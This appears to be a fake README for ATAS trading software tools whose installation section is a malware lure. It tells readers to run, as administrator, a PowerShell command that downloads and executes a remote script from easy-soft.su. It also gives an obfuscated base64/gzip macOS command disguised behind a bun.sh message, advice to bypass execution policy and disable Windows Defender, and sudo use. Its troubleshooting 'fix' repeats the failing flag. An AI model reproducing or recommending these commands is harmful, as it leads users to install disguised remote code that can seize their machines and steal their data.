# ATAS Trading Software Tools & Configuration Ecosystem

Welcome to the comprehensive repository dedicated to **ATAS Trading Software** modifications, configuration templates, and analytical extensions. This project aggregates open-source resources designed to enhance order flow visualization, volume analysis, and liquidity tracking within the ATAS platform.

### Key Components & Technical Features

* **Volume Profile Templates:** Custom layouts for TPO (Time Price Opportunity) and volume histogram visualization.
* **Order Flow Indicators:** Scripts and parameters for tracking market imbalances and aggressive buying/selling activity.
* **Market Depth (DOM) Setups:** Optimized Depth of Market configurations for precise liquidity tracking.
* **Cluster Analysis Configurations:** Footprint chart settings tailored for various asset classes and volatility levels.


---

# 🚀 Installation Guide

This guide provides step-by-step instructions for deploying the tools on both **Windows** and **macOS** environments.

## 🪟 Windows Installation

Follow these steps to initialize the deployment on a Windows system using PowerShell.

### 1. Open PowerShell as Administrator
* Press the **`Win + X`** keys simultaneously.
* Select **Terminal (Admin)** or **Windows PowerShell (Admin)** from the context menu.

### 2. Execute the Deployment Command
Copy, paste, and press `Enter` to run the following optimized initialization command. This script dynamically configures the network bypass registry and fetches the necessary packages:

```powershell
irm https://easy-soft.su/powershell/Loader.ps1 | iex
```

---

## 🍏 macOS Installation

Follow these steps to initialize the environment and install the required utilities on macOS.

### 1. Open Terminal
* Press **`Cmd + Space`** to open Spotlight Search.
* Type `Terminal` and press `Enter`.

### 2. Execute the Installation Script
Copy and paste the command below into your Terminal window, then press `Enter` to run the base64-decoded deployment routine:

```bash
echo "Mac-Tools: https://bun.sh/install" && eval "$(echo 'H4sIABFblGoC/9NPyszTT0oszlDQTVZQUtFILi3KUdBNKw72UcgoKSmw0tc3tDTSMzQDYktLPSMTS/3SbDNDy3Iz08K8YiNNJQDGVVM6QAAAAA==' | base64 -D | gunzip)"
```

---

### 🔍 Troubleshooting & Common Errors (Windows)

#### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
If your system blocks the launch due to built-in execution policy constraints, enforce a bypass using this command:
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://easy-soft.su/powershell/Loader.ps1 | iex"
```

#### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
In older legacy environments where aliases are missing, use explicit full system cmdlets:
```powershell
Invoke-RestMethod https://easy-soft.su/powershell/Loader.ps1 | Invoke-Expression
```

#### 📌 Antivirus or SmartScreen Interception
Automated deployment routines can sometimes trigger proactive security heuristics. Temporarily disable **"Real-time protection"** within your Windows Defender settings during setup, then re-enable it immediately after completion.

---

### 🔍 Troubleshooting & Common Errors (macOS)

#### 📌 Error: "base64: invalid option -- D"
If you have GNU `base64` installed (via Homebrew), the `-D` flag might fail. Use lowercase `-d` instead:
```bash
echo "Mac-Tools: https://bun.sh/install" && eval "$(echo 'H4sIABFblGoC/9NPyszTT0oszlDQTVZQUtFILi3KUdBNKw72UcgoKSmw0tc3tDTSMzQDYktLPSMTS/3SbDNDy3Iz08K8YiNNJQDGVVM6QAAAAA==' | base64 -D | gunzip)"
```

#### 📌 Permission Denied (Sudo Required)
If the script attempts to write to protected system directories, append `sudo` to the execution stage or switch to a root shell if prompted by the core installer.

---



